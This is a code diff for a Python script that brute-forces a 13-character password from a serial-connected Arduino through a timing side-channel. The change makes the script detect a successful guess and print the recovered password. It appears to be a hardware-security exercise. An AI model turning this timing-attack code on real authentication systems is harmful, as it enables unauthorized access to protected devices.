@@ -10,7 +10,7 @@ password_length = 13
 samples_per_iteration = 10
 
 
-def measure_response_time(data, arduino: serial.Serial):
+def measure_response_time(data, arduino: serial.Serial,position):
     try:
         arduino.reset_input_buffer()
         arduino.reset_output_buffer()
@@ -24,7 +24,9 @@ def measure_response_time(data, arduino: serial.Serial):
         response = arduino.readline().decode('utf-8').strip()
         arduino.readline()
         print(f"Sent: {data}, Received: {response}, Time: {elapsed_time:.6f} seconds")
-        return elapsed_time
+        if position == password_length and response.find("failure") == -1:
+            return elapsed_time, response
+        return elapsed_time, None
     except Exception as exception:
         print(f"Error: {exception}")
         return None, None
@@ -53,7 +55,10 @@ def get_password(test_password, reader: serial.Serial):
             test_string = ''.join(test_password)
             times = []
             for _ in range(samples_per_iteration):
-                elapsed_time = measure_response_time(test_string, reader)
+                elapsed_time, response = measure_response_time(test_string, reader, position+1)
+                if response is not None:
+                    print(f"Password found: {test_string}");
+                    return test_string
                 if elapsed_time:
                     times.append(elapsed_time)
             filtered_times = remove_outliers(times)
